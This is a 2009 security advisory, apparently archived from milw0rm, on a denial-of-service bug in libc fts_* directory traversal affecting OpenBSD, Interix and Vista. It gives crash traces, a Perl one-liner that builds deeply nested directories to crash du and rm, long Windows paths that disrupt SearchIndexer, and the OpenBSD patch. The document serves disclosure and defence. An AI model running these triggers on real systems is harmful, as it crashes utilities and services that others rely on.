@@ -1,0 +1,237 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+[libc:fts_*():multiple vendors, Denial-of-service ]
+
+Author: Maksymilian Arciemowicz
+SecurityReason.com
+Date:
+- - Dis.: 21.10.2008
+- - Pub.: 04.03.2009
+
+CVE: CVE-2009-0537
+
+We are going informing all vendors, about this problem.
+
+Affected Software (official):
+- - OpenBSD 4.4
+	/usr/src/lib/libc/gen/fts.c
+- - Microsoft Interix
+	6.0 10.0.6030.0 x86
+- - Microsft Vista Enterprise
+	SearchIndexer.exe
+
+probably more...
+
+Original URL:
+http://securityreason.com/achievement_securityalert/60
+
+- --- 0.Description ---
+
+The fts functions are provided for traversing UNIX file hierarchies.
+The fts_open() function returns a "handle" on a file hierarchy, which is then supplied to the other fts functions.
+The function fts_read() returns a pointer to a structure describing one of the files in the file hierarchy.
+The function fts_children() returns a pointer to a linked list of structures, each of which describes one of the files contained in a directory within the hierarchy.
+
+	typedef struct _ftsent {
+             unsigned short fts_info;        /* flags for FTSENT structure */
+             char *fts_accpath;              /* access path */
+             char *fts_path;                 /* root path */
+             size_t fts_pathlen;             /* strlen(fts_path) */
+             char *fts_name;                 /* file name */
+             size_t fts_namelen;             /* strlen(fts_name) */
+             short fts_level;                /* depth (-1 to N) */
+             int fts_errno;                  /* file errno */
+             long fts_number;                /* local numeric value */
+             void *fts_pointer;              /* local address value */
+             struct _ftsent *fts_parent;     /* parent directory */
+             struct _ftsent *fts_link;       /* next file structure */
+             struct _ftsent *fts_cycle;      /* cycle structure */
+             struct stat *fts_statp;         /* stat(2) information */
+     } FTSENT;
+
+- --- 1. libc:fts_*():multiple vendors, Denial-of-service ---
+The main problem exist in fts_level from ftsent structure. Type of fts_level is short.
+
+let's see /usr/src/lib/libc/gen/fts.c (OpenBSD)
+
+- ---line-616-625---
+	/*
+	 * Figure out the max file name length that can be stored in the
+	 * current path -- the inner loop allocates more path as necessary.
+	 * We really wouldn't have to do the maxlen calculations here, we
+	 * could do them in fts_read before returning the path, but it's a
+	 * lot easier here since the length is part of the dirent structure.
+	 *
+	 * If not changing directories set a pointer so that can just append
+	 * each new name into the path.
+	 */
+- ---line-616-625---
+
+"We really wouldn't have to do the maxlen calculations here..."
+
+Here should be some level or pathlen monitor. Should.
+
+             short fts_level;                /* depth (-1 to N) */
+
+fts_level is short type, no aleph zero
+
+- ---line-247-249---
+#define	NAPPEND(p)							\
+	(p->fts_path[p->fts_pathlen - 1] == '/'				\
+	    ? p->fts_pathlen - 1 : p->fts_pathlen)
+- ---line-247-249---
+
+this function will crash, when we will requests to wrong allocated memory.
+
+So, what is wrong:
+
+127# pwd
+/home/cxib
+127# du /home/
+4       /home/cxib/.ssh
+Segmentation fault (core dumped)
+127# rm -rf Samotnosc
+Segmentation fault (core dumped)
+127# chmod -R 000 Samotnosc
+Segmentation fault (core dumped)
+
+
+127# gdb -q du
+(no debugging symbols found)
+(gdb) r /home/
+Starting program: /usr/bin/du /home/
+4       /home/cxib/.ssh
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0b3e65c1 in fts_read (sp=0x8a1b11c0) at /usr/src/lib/libc/gen/fts.c:385
+385     name:           t = sp->fts_path + NAPPEND(p->fts_parent);
+(gdb) print p->fts_level
+$1 = -19001
+(gdb) print p->fts_path
+$2 = 0x837c9000 <Address 0x837c9000 out of bounds>
+
+and we have answer.
+
+
+127# cd /home/cxib
+127# mkdir len
+127# cd len
+127# mkdir 24
+127# mkdir 23
+127# mkdir 22
+127# cd 22
+127# perl -e '$a="C"x22;for(1..50000){ ! -d $a and mkdir $a and chdir $a }'
+127# du .
+Segmentation fault (core dumped)
+127# cd ../23/
+127# perl -e '$a="C"x23;for(1..50000){ ! -d $a and mkdir $a and chdir $a }'
+127# du .
+Segmentation fault (core dumped)
+127# cd ../24/
+127# perl -e '$a="C"x24;for(1..50000){ ! -d $a and mkdir $a and chdir $a }'
+127# du .
+/* Will print correctly output */
+
+In all cases, the function should return an error flag "ENAMETOOLONG".
+
+The security consequences can be derived from the crash of the program. All combinations like " while ( fts_read ( ) ) " and " ftw ( ) " function, constitute a potential risk.
+
+Examples of vulnerable programs:
+du
+rm
+chmod -R
+chgrp -R
+
+In the case of Microsoft Interix, the situation is very similar. 
+
+% uname -a
+Interix cxib-PC 6.0 10.0.6030.0 x86 Intel_x86_Family6_Model123_Stepping6
+% du pa
+Segmentation fault
+
+Vista Enterprise does not allow for the creation of the name too long. At the same time, has great problems with the operation of such nodes.
+Using Interix subsystem, you can create a deep tree to the NTFS partition.
+
+example:
+fts_level -10000
+	
+Then, we can no longer do anything with incorrect directory from the Windows API.
+If you try change permissions, copy the directory, you will receive a lot of bugs (stack overflow etc.).
+
+SearchIndexer.exe will crash many times
+
+- ---
+Faulting application SearchIndexer.exe, version 7.0.6001.16503, time
+stamp 0x483b99af, faulting module msvcrt.dll, version 7.0.6001.18000,
+time stamp 0x4791a727, exception code 0x40000015, fault offset
+0x00053adb, process id 0x364, application start time 0x01c99276bd383759.
+- ---
+	
+In some cases, is possible to permanently lock the service.
+
+Interesting behavior we can see an example
+
+C:\Users\cxib\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\Not_existed_node\
+
+(try put this path into explorer)
+
+where
+
+C:\Users\cxib\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\O\
+
+of course exists
+
+We do not see the potential risk, but the algorithm should be changed.
+
+We publish this note, because the vulnerability was only tested for OpenBSD. Many other systems, reacts strangely to the potential testing.
+
+- --- 2. Fix ---
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gen/fts.c
+
+Fix by Otto Moerbeek:
+
+Index: fts.c
+===================================================================
+RCS file: /cvs/src/lib/libc/gen/fts.c,v
+retrieving revision 1.41
+diff -u -p -r1.41 fts.c
+- --- fts.c	27 Dec 2008 12:30:13 -0000	1.41
++++ fts.c	10 Feb 2009 09:00:24 -0000
+@@ -633,6 +633,14 @@ fts_build(FTS *sp, int type)
+ 	len++;
+ 	maxlen = sp->fts_pathlen - len;
+ 
++	if (cur->fts_level == SHRT_MAX) {
++		(void)closedir(dirp);
++		cur->fts_info = FTS_ERR;
++		SET(FTS_STOP);
++		errno = ENAMETOOLONG;
++		return (NULL);
++	}
++
+ 	level = cur->fts_level + 1;
+ 
+ 	/* Read the directory, attaching each entry to the `link' pointer. */
+
+
+- --- 3. Greets ---
+Very thanks for Otto Moerbeek and all OpenBSD devs.
+
+sp3x Infospec schain Chujwamwdupe p_e_a pi3
+
+- --- 4. Contact ---
+Author: SecurityReason.com [ Maksymilian Arciemowicz ]
+Email: cxib [a.t] securityreason [d00t] com
+GPG: http://securityreason.com/key/Arciemowicz.Maksymilian.gpg
+http://securityreason.com
+http://securityreason.pl
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.9 (OpenBSD)
+
+iEYEARECAAYFAkmu7s4ACgkQpiCeOKaYa9ZEjgCg1v0YJVH7nAWmsBnD0szmxY2Q
+07cAoMd+Mh8AWxuipuOTVAtBCRmNJVob
+=tXhh
+-----END PGP SIGNATURE-----
+
+# milw0rm.com [2009-03-05]
